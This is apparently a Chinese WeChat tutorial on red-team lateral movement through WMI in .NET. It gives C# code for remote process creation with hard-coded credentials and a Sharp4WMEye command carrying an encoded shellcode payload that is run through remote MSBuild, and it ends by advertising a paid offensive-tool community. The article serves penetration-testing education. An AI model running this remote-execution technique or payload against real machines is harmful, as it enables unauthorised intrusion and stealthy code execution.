---
title: .NET | WMI横向移动在红队实战中的应用
url: https://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247497885&idx=1&sn=c92a6419db1b308afc79918f719c2c61&chksm=fa595670cd2edf665b10ace7090a885f1b5a7d984e0c35010e4fa7e7e34ecf4611d54c697973&scene=58&subscene=0#rd
source: dotNet安全矩阵
date: 2025-01-03
fetch_date: 2025-10-06T20:09:51.106396
---

# .NET | WMI横向移动在红队实战中的应用

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1Yic3ItKwUTHJWQNM63lSEA5q87jwDgOKKial96m0RpagtdgTEyPeYTdibuc5RMjkxaX6bAsxewffOSrw/0?wx_fmt=jpeg)

# .NET | WMI横向移动在红队实战中的应用

原创

专攻.NET安全的

dotNet安全矩阵

01

阅读须知

此文所提供的信息只为网络安全人员对自己所负责的网站、服务器等（包括但不限于）进行检测或维护参考，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责。本文所提供的工具仅用于学习，禁止用于其他方面

02

红队实战技术WMI

在红队渗透测试中，如何有效地执行横向渗透和远程攻击是成功的关键。横向渗透不仅要求渗透测试人员能够突破目标系统的防线，还需要灵活运用各种技术，以便在目标网络中移动并执行恶意代码。WMI是 Windows 操作系统提供的强大工具，它能够为红队提供对本地或远程计算机的广泛管理功能。通过 WMI，红队成员可以执行远程代码、获取系统信息，甚至操控目标机器的进程，绕过许多防御机制，保持隐蔽性。

03

原理分析

在 Windows 操作系统中，ManagementScope 表示 WMI 的管理作用域。WMI 作用域决定了操作的目标是本地计算机还是远程计算机，以及操作在哪个 WMI 命名空间下执行。

## 3.1 管理WMI作用域

在 Windows 操作系统中，ManagementScope 表示 WMI 的管理作用域。WMI 作用域决定了操作的目标是本地计算机还是远程计算机，以及操作在哪个 WMI 命名空间下执行。常见的本地系统路径：\\.\root\cimv2，远程系统路径：\\RemoteMachineName\root\cimv2。在远程系统中执行 WMI 操作，例如创建进程或获取系统信息，具体代码如下所示。

```
```
ConnectionOptions options = new ConnectionOptions
{
    Username = "admin",
    Password = "password",
    Impersonation = ImpersonationLevel.Impersonate
};

ManagementScope scope = new ManagementScope("\\\\RemotePC\\root\\cimv2", options);
scope.Connect();
Console.WriteLine("连接成功！");
```
```

## 3.2 操作WMI类

在 Windows 操作系统中，ManagementClass 表示 WMI 中的特定类，提供对该类的属性、方法和实例的访问。WMI 类是管理对象的定义，例如：Win32\_Process 用于管理进程，另外，InvokeMethod 调用指定方法。

```
```
ManagementClass processClass = new ManagementClass(scope, new ManagementPath("Win32_Process"), null);
ManagementBaseObject inParams = processClass.GetMethodParameters("Create");
inParams["CommandLine"] = "notepad.exe";
ManagementBaseObject outParams = processClass.InvokeMethod("Create", inParams, null);
Console.WriteLine("进程创建成功，返回值: {0}", outParams["ReturnValue"]);
```
```

## 3.3 管理对象实例

在 Windows 操作系统中，ManagementBaseObject 是 WMI 中所有对象的基类，包括类实例、方法输入参数和输出结果。通过它可以访问 WMI 对象的属性、方法和系统元数据，代码参考如下所示。

```
```
ManagementBaseObject inParams = processClass.GetMethodParameters("Create");
inParams["CommandLine"] = "notepad.exe";
foreach (PropertyData prop in inParams.Properties)
{
    Console.WriteLine("属性: {0}, 值: {1}", prop.Name, prop.Value);
}
ManagementBaseObject outParams = processClass.InvokeMethod("Create", inParams, null);
Console.WriteLine("方法返回值: {0}", outParams["ReturnValue"]);
```
```

通过 ManagementScope、ManagementClass的协作，可以轻松实现对本地或远程计算机的管理操作。这些类适用于红队自动化任务、远程管理和监控，实战中的Sharp4WMEye便是基于这种技术上实现的一款神器。

04

工具实现

Sharp4WMEye 的主要用途是在渗透测试中通过利用 **WMI** 和 **远程 MSBuild** 执行远程代码。该工具结合了这两种技术，绕过了许多传统的安全防护措施，为渗透测试人员提供了一种隐蔽的横向渗透方法。

![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1Yic3ItKwUTHJWQNM63lSEA5qJQodjYmS3raUK1ibQ1ibEwmwF1RLMnzB7gE6RxH8sQGel5zoR3Ma3o0Q/640?wx_fmt=jpeg&from=appmsg)

Sharp4WMEye 的使用方式非常简单。以下是工具的基本用法示例，攻击者需要提供目标系统的 IP 地址以便进行远程连接。

```
```
Sharp4wmeye.exe "192.168.101.86" "ivan1ee" "123456" xml /OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1qAY2FsgAAAFBoMYtvh//Vu+AdKgpoppW9nf/VPAZ8CoD74HUFu0cTcm9qAFP/1WNhbGMuZXhlIGMA
```
```

![](https://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1Yic3ItKwUTHJWQNM63lSEA5qcg8kerMYFnZES287yPiakqyqxcxL0wdXkgaovZ7eyp42JaWE7vqo4dw/640?wx_fmt=png&from=appmsg)

综上，Sharp4WMEye 通过 WMI，攻击者可以在远程计算机上启动 MSBuild 执行恶意代码，而 MSBuild 的合法性和隐蔽性使得这类攻击难以被检测。文章涉及的工具已经打包在星球，感兴趣的师傅们可以加入自取。

05

推荐阅读

从漏洞分析到安全攻防，我们涵盖了.NET安全各个关键方面，为您呈现最新、最全面的.NET安全知识，下面是公众号发布的精华文章集合，推荐大家阅读！

[![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1Y8A7Qhn1ssuqNzv0iceS7ZhOuZ0AO4P1eFeG2xTdR2V6GWibiaxO2RenUJzrwOfvsdqofibI6H2uY0CLQ/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)](https://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247497429&idx=2&sn=a07599921eeb651ce005f57ed350be5e&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1Y8TQhCZMggf71ffibqISJ8f5naPJacnjn0roDyxxnAibmuwDJq2p1GTBpicZhnM9o9gTIu9S9ia8Uqwtw/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&retryload=1&tp=webp)](https://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247497498&idx=2&sn=00900a0c29c85b41fe6a586d7e5c3571&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1Y9tl26Kh2sQYI9guTCflSwQP8Gs9z7iamicOvlQv4UYzjwd378D03h7yEYFtZ6xA74qicInoed7qpBWg/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)](http://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247495167&idx=1&sn=9280c55fdc7c9146e549be470cf9f120&chksm=fa594312cd2eca04bfe8fd1fd3890b389d9c700b9b69d897f919addac399bab4f4d2e55f6b4f&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YibQ6VpnKYXPqfmHnyJHzHxOeP3ichLEiafhGiawd8mjkHYBalO37fN8QQkNdic1hjjY2Nvw2Bib6UvibDRA/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)](http://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247490722&idx=2&sn=c9807daa5548e139a0c67303cb26882a&chksm=fa5ab24fcd2d3b59a85be03e69c655ffd644e8458bc2ec3f572da4b40b43e5003fda756f35b4&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YibQ6VpnKYXPqfmHnyJHzHxOjWgak8cI7Mic1wTt3YSKqsbLl9rPe0cF9WGtOEuiceLreTNtNVib6IKlw/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)](http://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247490703&idx=2&sn=e7db1ff662e5b41d9a1806fbdf33e204&chksm=fa5ab262cd2d3b7470f029b9a07d1dd3611e63be910b01a601144efe7d84b5f016f488a354cf&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YibQ6VpnKYXPqfmHnyJHzHxO8jJ97qqWlY6XR03DqSnutcHFYibDtVG5Y2wEaK4p2bzEicZblY4oQyGg/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)](http://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247490700&idx=2&sn=e8a865ada7c743e77fb9e953c5da74b1&chksm=fa5ab261cd2d3b7736387eddfc8524a378a1604552d0c9b55476646f9e8275f48818aab8acad&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YibQ6VpnKYXPqfmHnyJHzHxOe1viaia4aoFceunsUdIna4DPbmemW1EqlBMrovOoE6bdAFF3iaApxz5qA/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)](http://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247488736&idx=2&sn=d24aaa297c51eb620ccdf67af513086d&chksm=fa5aba0dcd2d331bbb22f3f5657199d718c90efed42fcb9cb67ec23d342f887c117e4858f1cb&scene=21#wechat_redirect)

06

欢迎加入.NET安全星球

为了更好地应对基于.NET技术栈的风险识别和未知威胁，dotNet安全矩阵星球从创建以来一直聚焦于.NET领域的安全攻防技术，定位于高质量安全攻防星球社区，也得到了许多师傅们的支持和信任，通过星球深度连接入圈的师傅们，一起推动.NET安全高质量的向前发展。 星球门票后期价格随着内容和质量的不断沉淀会适当提高，因此越早加入越好！

    目前dot.Net安全矩阵星球已成为中国.NET安全领域最知名、最活跃的技术知识库之一，从.NET Framework到.NET Core，从Web应用到PC端软件应用，无论您是初学者还是经验丰富的开发人员，都能在这里找到对应的安全指南和最佳实践。

星球汇聚了各行业安全攻防技术大咖，并且每日分享.NET安全技术干货以及交流解答各类技术等问题，社区中发布很多高质量的.NET安全资源，可以说市面上很少见，都是干货。

![](https://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1YibzerwUbGOupPoJgYlZNMo1gg58eGoicPibjMBKkEo1zOia6zOyeupYasZZ9DTFvJVvzJQTEuhKrvTsA/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)

![](https://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1Y8DlZsGiaRRGghficKFQt58Ueoynsb0my3uzMAb7VwM5bgtnb4nbl4c9xdEjGraUXic6pO0p38xmWiaRQ/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YibQ6VpnKYXPqfmHnyJHzHxOc2SogKzZ16SD7dpzF3v81kia4ZAx5QU5ibnNibEo8kZZSJgrficz4Ckxwg/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)

星球文化始终认为授人以鱼不如授人以渔！加入星球后可以跟星主和嘉宾们一对一提问交流，20+个专题栏目涵盖了点、线、面、体等知识面，助力师傅们快速成长！其中主题包括.NET Tricks、漏洞分析、内存马、代码审计、预编译、反序列化、webshell免杀、命令执行、C#工具库等等。![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YiccvW0LwqSx3grm4bgM0fz01qCxrYGBR94wibZ7sk1zIO9DzCgviab9vmUic8qmvynXhSM8LxFhGG97w/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)

    我们倾力打造专刊、视频等配套学习资源，循序渐进的方式引导加深安全攻防技术提高以及岗位内推等等服务。![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1Y9XgicSeCfnDO0KyvDNdCZhG3pTSWHRekG0Wrp0FXyHO1mz9ia5uiaICjCmg5jIzx4ERLU8MjXWVSkCw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)

我们还有一个会员专属的内部星球陪伴群，加入的成员可以通过在群里提出问题或参与论的方式来与其他成员交流思想和经验。此外还可以通过星球或者微信群私聊向我们进行提问，以获取帮助迅速解决问题。

为了助力大家在2024国家级hvv演练中脱颖而出，我们特别整理出了一套涵盖dotNet安全矩阵星球的八大.NET相关方向工具集。

```
.NET 免杀WebShell
.NET 反序列化漏洞
.NET 安全防御绕过
.NET 内网信息收集
.NET 本地权限提升
.NET 内网横向移动
.NET 目标权限维持
.NET 数据外发传输
```

这些阶段所涉及的工具集不仅代表了当前.NET安全领域的最前沿技术，更是每一位网络安全爱好者不可或缺的实战利器。

![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1Y9ZQNibdZiazXl9zhxh3wB9n5LXcwJqbvQywJQLsckcGGV6NNWLITK1VkDV2CPeahvyUbPN...